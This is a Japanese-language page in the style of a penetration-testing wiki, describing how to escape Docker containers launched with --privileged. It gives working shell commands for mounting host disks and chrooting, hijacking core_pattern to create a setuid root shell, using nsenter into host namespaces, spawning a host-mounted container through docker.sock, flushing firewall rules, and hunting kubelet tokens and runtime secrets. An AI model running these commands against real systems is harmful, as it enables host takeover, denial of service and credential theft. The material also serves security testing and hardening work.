# `--privileged` コンテナからの脱出

{{#include ../../../banners/hacktricks-training.md}}

## 概要

`--privileged` で起動したコンテナは、1〜2個の追加権限が付与された通常のコンテナとは異なります。実際には、`--privileged` は通常ワークロードを危険なホストリソースから遠ざけているいくつかのデフォルトのランタイム保護を削除または弱体化します。正確な挙動はランタイムやホストに依存しますが、Docker では通常次のようになります:

- すべての capabilities が付与される
- device cgroup の制限が解除される
- 多くのカーネルファイルシステムが読み取り専用でマウントされなくなる
- デフォルトでマスクされている procfs のパスが消える
- seccomp フィルタリングが無効になる
- AppArmor の隔離が無効になる
- SELinux の隔離が無効になるか、非常に広いラベルに置き換えられる

重要な結果は、privileged コンテナは通常微妙なカーネルエクスプロイトを必要としないということです。多くの場合、ホストデバイス、ホスト向けのカーネルファイルシステム、またはランタイムインタフェースと直接やり取りして、そのままホストシェルへピポットできます。

## `--privileged` が自動的に変更しないもの

`--privileged` はホストの PID、network、IPC、または UTS namespace に自動的に参加しません。privileged コンテナは依然としてプライベートな namespaces を持つことがあります。これはいくつかのエスケープチェーンが次のような追加条件を必要とすることを意味します:

- ホストの bind mount
- ホスト PID 共有
- ホスト networking
- ホストデバイスが見えること
- 書き込み可能な proc/sys インタフェース

これらの条件は実際のミスコンフィグでは満たされやすいですが、概念的には `--privileged` 自体とは別物です。

## エスケープ経路

### 1. 公開されたデバイス経由でホストディスクをマウントする

privileged コンテナは通常 `/dev` 以下でより多くのデバイスノードを見ます。ホストのブロックデバイスが見えている場合、最も単純な脱出はそれをマウントしてホストファイルシステムに `chroot` することです:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
ルートパーティションが明確でない場合は、まずブロックレイアウトを列挙してください:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
実際的に `chroot` する代わりに書き込み可能なホストマウントに setuid ヘルパーを配置する場合、すべてのファイルシステムが setuid ビットを尊重するわけではないことに注意してください。ホスト側での簡易な能力チェックは次のとおりです:
```bash
mount | grep -v "nosuid"
```
これは、`nosuid` ファイルシステム上の書き込み可能なパスが、従来の「setuid シェルを置いて後で実行する」ようなワークフローではあまり魅力的でないため役立ちます。

The weakened protections being abused here are:

- デバイスへの完全な露出
- 広範な capabilities、特に `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. ホストの bind mount をマウントまたは再利用して `chroot`

ホストのルートファイルシステムが既にコンテナ内にマウントされている場合、またはコンテナが特権を持ち必要なマウントを作成できる場合、ホストのシェルはしばしば1回の `chroot` で到達できます:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
ホストの root bind mount が存在しないがホスト storage に到達可能な場合は、作成する:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
この経路は次を悪用します:

- マウント制限の緩和
- capabilities を完全に付与
- MAC confinement の欠如

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. 書き込み可能な `/proc/sys` または `/sys` の悪用

`--privileged` の大きな結果の一つは、procfs と sysfs の保護が大幅に弱くなることです。これにより、通常はマスクされているか読み取り専用でマウントされているホスト向けカーネルインターフェースが露出する可能性があります。

代表的な例は `core_pattern` です:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
その他の価値の高いパスには以下が含まれます:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
このパスは以下を悪用します:

- missing masked paths
- missing read-only system paths

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Use Full Capabilities For Mount- Or Namespace-Based Escape

特権コンテナは、通常のコンテナから削除されるはずの能力（`CAP_SYS_ADMIN`、`CAP_SYS_PTRACE`、`CAP_SYS_MODULE`、`CAP_NET_ADMIN` など多数）を取得します。別の露出面が存在するだけで、ローカルでの足がかりをホスト脱出に変えるのに十分であることが多いです。

簡単な例として、追加のファイルシステムをマウントし、namespace entry を使用する方法があります:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
ホストPIDも共有されている場合、手順はさらに短くなります:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
この経路は以下を悪用します:

- デフォルトの特権 (capabilities) セット
- ホストPID共有（オプション）

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. ランタイムソケット経由での脱出

特権コンテナはしばしばホストのランタイム状態やソケットが見える状態になります。Docker、containerd、または CRI-O のソケットにアクセスできる場合、最も簡単な方法は runtime API を使ってホストアクセスを持つ別のコンテナを起動することです:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
containerd の場合:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
この経路は以下を悪用します:

- privileged runtime exposure
- host bind mounts created through the runtime itself

関連ページ:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. ネットワーク隔離の副作用を取り除く

`--privileged` 単体ではホストのネットワーク名前空間に参加しませんが、コンテナが `--network=host` やその他のホストネットワークアクセスを持っていると、ネットワークスタック全体が変更可能になります:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
これは必ずしも直接的なホストシェルを意味するわけではありませんが、denial of service、トラフィックの傍受、あるいはループバック専用の管理サービスへのアクセスを引き起こす可能性があります。

関連ページ:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. ホストのシークレットとランタイム状態の読み取り

クリーンなシェルエスケープが直ちに可能でない場合でも、privileged containersはホストのシークレット、kubeletの状態、ランタイムメタデータ、および隣接するコンテナのファイルシステムを読み取るのに十分なアクセス権を持っていることが多いです:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
`/var` がホストにマウントされているかランタイムディレクトリが見えている場合、ホストシェルを取得する前でも lateral movement や cloud/Kubernetes の認証情報窃取に十分な場合があります。

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## 確認

以下のコマンドの目的は、どの privileged-container escape families が直ちに実行可能かを確認することです。
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
ここで注目すべき点:

- 完全な capability セット、特に `CAP_SYS_ADMIN`
- 書き込み可能な proc/sys の露出
- ホストデバイスが見えている
- seccomp と MAC 封じ込めがない
- runtime sockets またはホスト root の bind mounts

上記のうちどれか一つでも post-exploitation に十分な場合がある。複数が同時にあると、通常 container は実質的に 1〜2 コマンドで host compromise に至る。

## 関連ページ

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
